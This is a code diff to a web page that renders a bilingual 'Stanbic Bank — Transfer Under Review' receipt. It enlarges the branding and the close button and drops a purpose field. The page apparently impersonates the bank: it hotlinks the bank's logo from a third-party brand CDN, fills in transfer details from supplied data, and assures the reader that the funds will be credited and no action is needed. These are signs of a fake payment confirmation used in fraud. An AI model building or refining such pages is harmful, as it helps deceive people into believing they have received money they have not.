@@ -39,19 +39,29 @@
     position: relative; overflow: hidden;
   }
 
-  /* ─── TOOLBAR ─── */
+  /* ─── TOOLBAR — logo + text ─── */
   .toolbar {
     flex-shrink: 0; background: var(--sb-white);
-    padding: max(12px, env(safe-area-inset-top, 0px)) 16px 12px;
+    padding: max(14px, env(safe-area-inset-top, 0px)) 16px 14px;
     border-bottom: 1px solid var(--sb-border);
     display: flex; align-items: center; justify-content: space-between;
     gap: 10px; z-index: 30;
   }
-  .toolbar-logo { height: 26px; width: auto; display: block; }
+  .toolbar-brand {
+    display: flex; align-items: center; gap: 8px;
+    min-width: 0;
+  }
+  .toolbar-logo { height: 30px; width: auto; display: block; flex-shrink: 0; }
+  .toolbar-brand-text {
+    font-size: 18px; font-weight: 800; letter-spacing: -0.4px;
+    color: var(--sb-primary); line-height: 1; white-space: nowrap;
+  }
+  .toolbar-brand-text .dot { color: var(--sb-gold); }
+
   .toolbar-actions { display: flex; gap: 8px; }
   .tool-btn {
     display: inline-flex; align-items: center; justify-content: center; gap: 6px;
-    padding: 8px 12px; font-size: 12px; font-weight: 600;
+    padding: 9px 12px; font-size: 12px; font-weight: 600;
     border-radius: 8px; font-family: inherit; cursor: pointer;
     transition: all .15s; border: 1px solid var(--sb-border);
     background: var(--sb-white); color: var(--sb-primary);
@@ -167,28 +177,6 @@
     font-size: 14px; margin-top: 2px; word-break: break-word;
   }
 
-  /* Purpose card */
-  .purpose-card {
-    background: #FFFDF5; border-radius: 12px;
-    border: 1px solid #F2E4B8;
-    padding: 12px 16px; margin-bottom: 16px;
-    position: relative; overflow: hidden;
-    text-align: left;
-  }
-  .purpose-card.hidden { display: none; }
-  .purpose-card::before {
-    content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px;
-    background: var(--sb-gold);
-  }
-  .purpose-card .label {
-    font-size: 10px; font-weight: 800; letter-spacing: 0.7px;
-    text-transform: uppercase; color: #8A6600; margin-bottom: 3px; display: block;
-  }
-  .purpose-card .purpose {
-    font-size: 13px; font-weight: 700; color: var(--sb-navy);
-    line-height: 1.4; word-break: break-word;
-  }
-
   /* Details panel */
   .details-panel {
     width: 100%;
@@ -199,7 +187,7 @@
   }
   .detail-row {
     display: flex; justify-content: space-between; align-items: flex-start;
-    gap: 12px; padding: 11px 0;
+    gap: 12px; padding: 12px 0;
     border-bottom: 1px solid var(--sb-border);
     font-size: 12px;
   }
@@ -217,19 +205,27 @@
   }
   .detail-row .v.status-review { color: var(--sb-amber); font-weight: 800; }
 
-  /* Footer */
+  /* Footer — logo + text */
   .sb-footer {
     width: 100%; margin-top: 4px;
     background: var(--sb-navy);
     border-radius: 12px;
-    padding: 14px 16px;
+    padding: 16px 18px;
     display: flex; align-items: center; justify-content: space-between;
     gap: 12px; text-align: left;
   }
-  .sb-footer .foot-logo {
-    height: 20px; width: auto; display: block;
-    filter: brightness(0) invert(1); opacity: 0.96;
+  .foot-brand {
+    display: flex; align-items: center; gap: 8px;
+    min-width: 0;
   }
+  .sb-footer .foot-logo {
+    height: 24px; width: auto; display: block; flex-shrink: 0;
+  }
+  .sb-footer .foot-brand-text {
+    font-size: 17px; font-weight: 800; letter-spacing: -0.4px;
+    color: #fff; line-height: 1; white-space: nowrap;
+  }
+  .sb-footer .foot-brand-text .dot { color: var(--sb-gold); }
   .sb-footer .foot-support {
     font-size: 10.5px; color: rgba(255,255,255,0.72); line-height: 1.5; font-weight: 500;
     text-align: right;
@@ -238,18 +234,20 @@
     color: var(--sb-gold); font-weight: 700; font-size: 11.5px;
   }
 
-  /* Close button */
+  /* ─── CLOSE BUTTON — BIG ─── */
   .close-btn {
-    width: 100%; margin-top: 16px; height: 52px;
+    width: 100%; margin-top: 18px; min-height: 64px;
     background: var(--sb-primary); color: #fff;
-    border: none; border-radius: 10px;
-    font-family: inherit; font-size: 14.5px; font-weight: 700;
-    letter-spacing: 0.5px; cursor: pointer;
-    box-shadow: 0 8px 20px rgba(1,0,140,0.22);
+    border: none; border-radius: 12px;
+    font-family: inherit; font-size: 17px; font-weight: 800;
+    letter-spacing: 0.4px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(1,0,140,0.28);
     transition: filter .15s, transform .1s;
+    display: flex; align-items: center; justify-content: center;
+    padding: 18px 24px;
   }
   .close-btn:hover { filter: brightness(1.08); }
-  .close-btn:active { transform: scale(0.99); }
+  .close-btn:active { transform: scale(0.985); }
 
   /* Toast */
   .toast {
@@ -264,7 +262,8 @@
 
   /* ─── RESPONSIVE ─── */
   @media (max-width: 380px) {
-    .toolbar-logo { height: 22px; }
+    .toolbar-logo { height: 26px; }
+    .toolbar-brand-text { font-size: 16px; }
     .tool-btn { padding: 7px 10px; font-size: 11px; }
     .top { padding: 18px 18px 22px; }
     .body { padding: 18px 18px 18px; }
@@ -273,9 +272,10 @@
     .tick svg { width: 36px; height: 36px; }
     .status-title { font-size: 18px; }
     .amount-block .val { font-size: 28px; }
-    .close-btn { height: 48px; font-size: 14px; }
+    .close-btn { min-height: 60px; font-size: 16px; }
     .sb-footer { padding: 14px 16px; }
-    .sb-footer .foot-logo { height: 18px; }
+    .sb-footer .foot-logo { height: 22px; }
+    .sb-footer .foot-brand-text { font-size: 15px; }
   }
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
@@ -303,11 +303,16 @@
 
   <!-- TOOLBAR -->
   <div class="toolbar">
-    <img
-      class="toolbar-logo"
-      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/light/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-      alt="Stanbic Bank"
-    >
+    <div class="toolbar-brand">
+      <img
+        class="toolbar-logo"
+        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+        alt="Stanbic Bank"
+        referrerpolicy="no-referrer"
+        onerror="this.style.display='none'"
+      >
+      <span class="toolbar-brand-text">Stanbic<span class="dot">.</span></span>
+    </div>
     <div class="toolbar-actions">
       <button class="tool-btn" id="copyBtn" onclick="copyReceipt()">
         <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
@@ -362,19 +367,19 @@
       <span class="recv-name" id="reqRecipient">—</span>
     </div>
 
-    <div class="purpose-card hidden" id="purposeCard">
-      <span class="label" id="purposeLabel">Purpose</span>
-      <span class="purpose" id="purposeValue">—</span>
-    </div>
-
     <div class="details-panel" id="detailsPanel"></div>
 
     <div class="sb-footer">
-      <img
-        class="foot-logo"
-        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-        alt="Stanbic Bank"
-      >
+      <div class="foot-brand">
+        <img
+          class="foot-logo"
+          src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+          alt="Stanbic Bank"
+          referrerpolicy="no-referrer"
+          onerror="this.style.display='none'"
+        >
+        <span class="foot-brand-text">Stanbic<span class="dot">.</span></span>
+      </div>
       <div class="foot-support">
         <span id="needHelpLabel">Customer Care</span><br>
         <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
@@ -404,7 +409,6 @@
       reviewNoticeBody: 'Your confirmation has been received. Our team is verifying the transfer. The total amount of <span class="amount-em" id="reviewAmount">—</span> will be credited to your account <strong>once the review is complete</strong>.',
       reviewNoticeNote: 'This usually takes a few minutes. You will receive a confirmation message from Stanbic Bank as soon as the amount is credited. No further action is needed from you.',
       toLabel: 'To',
-      purposeLabel: 'Purpose',
       needHelp: 'Customer Care',
       callLabel: 'Call',
       close: 'Close',
@@ -419,7 +423,6 @@
       receiptTitle: 'Stanbic Bank — Transfer Under Review',
       receiptStatus: 'Status',
       receiptAmount: 'Amount',
-      receiptPurpose: 'Purpose',
       receiptRecipient: 'Recipient',
       receiptCountry: 'Country',
       receiptTxId: 'Reference',
@@ -442,7 +445,6 @@
       reviewNoticeBody: 'Votre confirmation a été reçue. Notre équipe vérifie le virement. Le montant total de <span class="amount-em" id="reviewAmount">—</span> sera crédité sur votre compte <strong>une fois la vérification terminée</strong>.',
       reviewNoticeNote: 'Cela prend généralement quelques minutes. Vous recevrez un message de confirmation de Stanbic Bank dès que le montant sera crédité. Aucune action supplémentaire n\'est requise de votre part.',
       toLabel: 'À',
-      purposeLabel: 'Motif',
       needHelp: 'Service Client',
       callLabel: 'Appelez le',
       close: 'Fermer',
@@ -457,7 +459,6 @@
       receiptTitle: 'Stanbic Bank — Virement en cours de vérification',
       receiptStatus: 'Statut',
       receiptAmount: 'Montant',
-      receiptPurpose: 'Motif',
       receiptRecipient: 'Destinataire',
       receiptCountry: 'Pays',
       receiptTxId: 'Référence',
@@ -550,7 +551,6 @@
     document.getElementById('reviewNoticeBody').innerHTML = T.reviewNoticeBody;
     document.getElementById('reviewNoticeNote').textContent = T.reviewNoticeNote;
     document.getElementById('recipientLabel').textContent = T.toLabel;
-    document.getElementById('purposeLabel').textContent = T.purposeLabel;
     document.getElementById('needHelpLabel').textContent = T.needHelp;
     document.getElementById('callLabel').textContent = T.callLabel;
     document.getElementById('closeBtn').textContent = T.close;
@@ -570,16 +570,6 @@
 
     document.getElementById('reqRecipient').textContent = tx.rn || '—';
     document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
-
-    // Purpose card
-    const purposeCard = document.getElementById('purposeCard');
-    const purposeValue = document.getElementById('purposeValue');
-    if (tx.pu && tx.pu.trim()) {
-      purposeValue.textContent = tx.pu.trim();
-      purposeCard.classList.remove('hidden');
-    } else {
-      purposeCard.classList.add('hidden');
-    }
 
     const rows = [
       { k: T.kCountry,         v: tx.c },
@@ -613,7 +603,6 @@
       '=====================================',
       T.receiptStatus + ': ' + T.vUnderReview,
       T.receiptAmount + ': ' + amtFull,
-      tx.pu ? T.receiptPurpose + ': ' + tx.pu : '',
       T.receiptRecipient + ': ' + (tx.rn || ''),
       T.receiptCountry + ': ' + (tx.c || ''),
       T.receiptTxId + ': ' + (tx.ref || ''),
